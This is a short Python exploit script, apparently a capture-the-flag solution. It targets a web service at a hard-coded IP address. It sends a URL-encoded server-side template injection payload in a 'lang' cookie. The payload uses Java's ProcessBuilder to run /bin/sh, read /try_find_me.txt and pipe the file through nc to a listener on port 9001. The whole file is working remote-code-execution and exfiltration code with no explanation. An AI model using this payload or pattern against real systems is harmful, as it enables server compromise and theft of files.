#!/usr/bin/env python3

from requests import get, post
from urllib.parse import quote
url = "http://140.113.24.143:7878/"
cmd = '$%7bnew%20ProcessBuilder().command(%22/bin/sh%22%2c%22-c%22%2c%22cat%20/try_find_me.txt%20|%20nc%20140.113.24.143%209001%22).start()%7d::.x'
cookies = {
    'lang': cmd
}

r = get(url, cookies=cookies)